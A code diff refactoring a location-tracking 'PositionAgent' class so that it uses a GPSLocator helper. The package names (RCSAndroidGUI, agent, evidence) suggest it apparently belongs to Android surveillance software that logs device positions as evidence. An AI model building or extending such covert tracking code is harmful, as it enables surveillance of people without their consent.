@@ -6,6 +6,7 @@ import java.util.Date;
 
 import com.ht.RCSAndroidGUI.Device;
 import com.ht.RCSAndroidGUI.Status;
+import com.ht.RCSAndroidGUI.agent.position.GPSLocator;
 import com.ht.RCSAndroidGUI.conf.Configuration;
 import com.ht.RCSAndroidGUI.evidence.Evidence;
 import com.ht.RCSAndroidGUI.evidence.EvidenceType;
@@ -37,7 +38,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 	private static final int LOG_TYPE_CDMA = 5;
 	private static final long POSITION_DELAY = 1000;
 
-	LocationManager lm;
+	GPSLocator locator;
 
 	private boolean gpsEnabled;
 	private boolean cellEnabled;
@@ -51,16 +52,12 @@ public class PositionAgent extends AgentBase implements LocationListener {
 
 	@Override
 	public void begin() {
-		lm = (LocationManager) Status.getAppContext().getSystemService(
-				Context.LOCATION_SERVICE);
-		lm
-				.requestLocationUpdates(LocationManager.GPS_PROVIDER, period,
-						0, this);
+		locator = new GPSLocator(this, period);
 	}
 
 	@Override
 	public void end() {
-		lm.removeUpdates(this);
+		locator.requestStop();
 	}
 
 	@Override
@@ -218,7 +215,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 	boolean waitingForPoint = false;
 
 	private void locationGPS() {
-		if (lm == null) {
+		if (locator == null) {
 
 			Log.e(TAG, "GPS Not Supported on Device");
 
